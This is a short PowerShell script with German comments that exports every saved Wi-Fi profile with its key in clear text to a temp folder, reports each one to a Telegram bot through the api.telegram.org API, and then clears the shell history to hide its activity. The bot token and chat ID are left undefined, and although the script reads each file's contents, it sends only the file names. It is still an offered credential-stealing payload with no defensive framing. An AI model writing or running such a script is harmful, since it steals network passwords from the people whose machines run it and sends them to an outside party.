# Export-Verzeichnis
$exportDir = "$env:temp\SomeStuff"

# Sicherstellen, dass das Exportverzeichnis existiert
if (-not (Test-Path $exportDir)) {
    try {
        New-Item -ItemType Directory -Path $exportDir -Force
    } catch {
        Write-Host "Fehler beim Erstellen des Exportverzeichnisses: $_"
        return
    }
}

# WLAN-Profile exportieren (inkl. Schlüssel)
try {
    netsh wlan export profile key=clear folder=$exportDir
} catch {
    Write-Host "Fehler beim Exportieren der WLAN-Profile: $_"
    return
}

# Alle exportierten XML-Dateien lesen
$xmlFiles = Get-ChildItem -Path $exportDir -Filter "*.xml"
if ($xmlFiles.Count -eq 0) {
    Write-Host "Keine exportierten WLAN-Profile gefunden."
    return
}

# Webhook-Anfrage mit Datei-Upload
foreach ($xmlFile in $xmlFiles) {
    $fileContent = Get-Content -Path $xmlFile.FullName -Raw

    # Bereite die Daten vor
    $message = "Hier ist das WLAN-Profil: $($xmlFile.Name)"
    $uri = "https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&text=$([System.Web.HttpUtility]::UrlEncode($message))"

    try {
        # Senden Sie die Anfrage
        $response = Invoke-RestMethod -Uri $uri -Method Get
        Write-Host "Erfolgreich an den Telegram-Bot gesendet: $($xmlFile.Name)"
    } catch {
        Write-Host "Fehler beim Senden an den Telegram-Bot: $_"
    }
}

Clear-History
